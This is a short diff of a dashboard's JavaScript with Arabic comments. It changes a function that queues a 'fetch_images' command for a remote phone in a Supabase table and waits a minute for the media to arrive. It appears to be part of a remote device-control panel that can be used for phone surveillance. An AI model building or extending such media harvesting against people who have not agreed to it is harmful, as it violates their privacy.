@@ -293,17 +293,23 @@
             });
         }
 
+// 🖼️ جلب الوسائط مع قراءة العدد من القائمة والانتظار دقيقة كاملة
         async function requestFetchImages(page) {
             if (!activeDeviceId) return;
             currentImagePage = page;
+            
+            // قراءة العدد من الـ Dropdown
+            const selectedPageSize = parseInt(document.getElementById('pageSizeSelector').value) || 10;
+            
             document.getElementById('galleryPageIndicator').innerText = `الصفحة ${currentImagePage}`;
-            document.getElementById('galleryGrid').innerHTML = `<div class="col-span-full text-center py-6 text-amber-400 font-bold animate-pulse">جاري جلب الصور... ⏳</div>`;
+            document.getElementById('galleryGrid').innerHTML = `<div class="col-span-full text-center py-6 text-amber-400 font-bold animate-pulse">جاري جمع الوسائط من الهاتف... يرجى الانتظار ⏳ (مهلة دقيقة)</div>`;
 
             await supabaseClient.from('device_commands').insert([
-                { device_id: activeDeviceId, action: 'fetch_images', page: currentImagePage, page_size: imagePageSize }
+                { device_id: activeDeviceId, action: 'fetch_images', page: currentImagePage, page_size: selectedPageSize }
             ]);
 
-            setTimeout(loadGalleryFromCache, 3000);
+            // 🔴 المهلة أصبحت 60000 مللي ثانية (دقيقة كاملة)
+            setTimeout(loadGalleryFromCache, 60000);
         }
 
         async function loadGalleryFromCache() {
